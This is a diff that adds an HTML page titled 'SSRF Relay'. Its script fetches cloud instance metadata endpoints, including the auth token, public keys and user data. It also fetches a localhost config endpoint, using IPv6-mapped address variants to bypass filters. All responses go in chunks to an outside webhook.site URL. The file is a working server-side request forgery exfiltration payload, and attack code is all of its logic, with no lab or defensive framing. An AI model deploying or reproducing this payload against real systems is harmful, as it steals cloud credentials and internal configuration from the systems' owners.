@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head><title>SSRF Relay</title></head>
+<body>
+<pre id="out">Loading...</pre>
+<script>
+// SSRF Relay - fetches internal endpoints and exfiltrates to webhook
+const WH = 'https://webhook.site/4f2c20fd-8367-451c-ba1e-3ebc4ec2515a';
+const targets = [
+  'http://169.254.169.254/metadata/v1/vendor-data',
+  'http://169.254.169.254/metadata/v1/public-keys',
+  'http://169.254.169.254/metadata/v1/auth-token',
+  'http://169.254.169.254/metadata/v1/user-data',
+  'http://[::ffff:169.254.169.254]/metadata/v1/vendor-data',
+  'http://127.0.0.1:3000/config',
+  'http://[::ffff:127.0.0.1]:3000/config'
+];
+
+async function exfil() {
+  const out = document.getElementById('out');
+  for (const url of targets) {
+    try {
+      const r = await fetch(url);
+      const t = await r.text();
+      out.textContent += '\n=== ' + url + ' ===\n' + t;
+      // Send to webhook in chunks
+      const chunk = encodeURIComponent(t.substring(0, 1800));
+      const label = encodeURIComponent(url);
+      await fetch(WH + '?src=' + label + '&data=' + chunk, {mode:'no-cors'});
+      // If data is large, send additional chunks
+      if (t.length > 1800) {
+        for (let i = 1800; i < t.length; i += 1800) {
+          const c = encodeURIComponent(t.substring(i, i + 1800));
+          await fetch(WH + '?src=' + label + '&part=' + Math.floor(i/1800) + '&data=' + c, {mode:'no-cors'});
+        }
+      }
+    } catch(e) {
+      out.textContent += '\n=== ' + url + ' ERROR: ' + e.message + ' ===\n';
+      await fetch(WH + '?src=' + encodeURIComponent(url) + '&error=' + encodeURIComponent(e.message), {mode:'no-cors'});
+    }
+  }
+  out.textContent += '\n\nDone.';
+}
+exfil();
+</script>
+</body>
+</html>
